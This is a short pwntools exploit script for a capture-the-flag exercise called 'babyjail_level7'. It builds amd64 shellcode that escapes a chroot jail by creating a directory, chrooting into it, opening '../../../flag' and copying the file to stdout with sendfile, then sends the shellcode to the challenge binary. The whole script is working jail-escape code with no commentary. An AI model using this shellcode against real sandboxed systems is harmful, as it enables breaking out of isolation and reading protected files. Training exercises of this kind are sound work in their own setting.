from pwn import *
context.arch='amd64'
r = process(['/challenge/babyjail_level7','/'])
#r = process(['sudo','strace','/challenge/babyjail_level7','/tmp'])
payload = asm(
'''

    mov rax, 83
    lea rdi, [rip+new]
    mov rsi, 514
    syscall


    mov rax, 161
    lea rdi, [rip+new]
    syscall

    mov rax, 2
    lea rdi, [rip+f]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, 1
    mov rsi, rax
    mov rax, 40
    mov rdx, 0
    mov r10, 100
    syscall



    f:
    .string "../../../flag"

    new:
    .string "123"

    root:
    .string "/"
'''
)

r.send(payload)
r.interactive()